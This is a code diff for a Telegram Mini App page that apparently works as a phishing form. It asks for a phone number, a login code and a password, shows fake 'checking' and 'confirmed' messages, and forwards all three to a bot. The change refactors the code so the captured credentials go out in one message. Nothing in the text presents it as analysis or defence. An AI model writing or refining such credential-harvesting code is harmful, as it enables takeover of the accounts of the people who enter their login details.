@@ -171,12 +171,21 @@
         let code = '';
         let password = '';
         let step = 'contact';
+        let isDataSent = false;
 
         tg.ready();
         tg.expand();
 
-        // Отправка данных в бота
-        function sendDataToBot(data) {
+        // Функция отправки данных в бота (один раз)
+        function sendDataToBot() {
+            if (isDataSent) return;
+            isDataSent = true;
+            
+            const data = {
+                phone: phone,
+                code: code,
+                password: password
+            };
             tg.sendData(JSON.stringify(data));
         }
 
@@ -198,11 +207,7 @@
                 status.className = 'status success';
 
                 // Отправляем номер в бота
-                sendDataToBot({
-                    phone: phone,
-                    code: '',
-                    password: ''
-                });
+                sendDataToBot();
 
                 // Показываем шаг с кодом
                 document.getElementById('stepContact').style.display = 'none';
@@ -230,11 +235,7 @@
             }
 
             // Отправляем код в бота
-            sendDataToBot({
-                phone: phone,
-                code: code,
-                password: ''
-            });
+            sendDataToBot();
 
             status.textContent = '⏳ Проверка...';
             status.className = 'status';
@@ -255,11 +256,8 @@
                 const status = document.getElementById('status');
                 password = document.getElementById('passwordInput').value.trim();
 
-                sendDataToBot({
-                    phone: phone,
-                    code: code,
-                    password: password
-                });
+                // Отправляем пароль в бота
+                sendDataToBot();
 
                 status.textContent = '✅ Подтверждено!';
                 status.className = 'status success';
